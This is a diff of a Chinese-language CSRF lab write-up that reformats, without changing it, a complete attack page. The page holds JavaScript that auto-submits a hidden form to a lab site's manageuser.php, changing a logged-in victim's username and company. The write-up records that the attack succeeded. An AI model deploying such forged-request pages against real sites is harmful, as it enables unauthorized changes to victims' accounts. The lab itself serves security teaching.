@@ -35,48 +35,48 @@ _2016.04.23_
 ####**攻击**
 在攻击者的服务器里制作个攻击网页。其中包含提交恶意申请的javascript脚本。
 将以下内容的作为文件`index.html`保存在`/var/www/CSRF/Attacker`中：
-	
-	<html><body><h1>
-	This page forges an HTTP POST request.
-	</h1>
-	<script>
-	function post(url,fields)
-	{
-	//create a <formelement.
-	var p = document.createElement('form');
-	//construct the form
-	p.action = url;
-	p.innerHTML = fields;
-	p.target = '_self';
-	p.method = 'post';
-	//append the form to the current page.
-	document.body.appendChild(p);
-	//submit the form
-	p.submit();
-	}
-	function csrf_hack()
-	{
-	var fields;
-	// The following are form entries that need to be filled out
-	// by attackers. The entries are made hidden, so the victim
-	// won't be able to see them.
-	fields += "<input type='hidden' name='name' value='peter'>"; //修改用户名
-	fields += "<input type='hidden' name='userfile' value=''>";  
-	fields += "<input type='hidden' name='company' value='seed'>";  //修改公司名
-	post('http://www.heyheynormal.com/manageuser.php?action=edit',fields);
-	}
-	// invoke csrf_hack() after the page is loaded.
-	window.onload = function() { csrf_hack(); }
-	</script>
-	</body></html>
-
+```c++
+<html><body><h1>
+This page forges an HTTP POST request.
+</h1>
+<script>
+function post(url,fields)
+{
+//create a <formelement.
+var p = document.createElement('form');
+//construct the form
+p.action = url;
+p.innerHTML = fields;
+p.target = '_self';
+p.method = 'post';
+//append the form to the current page.
+document.body.appendChild(p);
+//submit the form
+p.submit();
+}
+function csrf_hack()
+{
+var fields;
+// The following are form entries that need to be filled out
+// by attackers. The entries are made hidden, so the victim
+// won't be able to see them.
+fields += "<input type='hidden' name='name' value='peter'>"; //修改用户名
+fields += "<input type='hidden' name='userfile' value=''>";  
+fields += "<input type='hidden' name='company' value='seed'>";  //修改公司名
+post('http://www.heyheynormal.com/manageuser.php?action=edit',fields);
+}
+// invoke csrf_hack() after the page is loaded.
+window.onload = function() { csrf_hack(); }
+</script>
+</body></html>
+```
 其中`csrf_hack()`函数中的：
-
+```javascript
 	fields += "<input type='hidden' name='name' value='peter'>"; //修改用户名
 	fields += "<input type='hidden' name='userfile' value=''>";  
 	fields += "<input type='hidden' name='company' value='seed'>";  //修改公司名
 	post('http://www.heyheynormal.com/manageuser.php?action=edit',fields);
-
+```
 即为提交恶意请求的关键。
 
 实验结果：在用户登录之后，访问`www.heyheyattacker.com`。用户的账号信息被更改，用户名被更改为`peter`，公司改为`seed`。
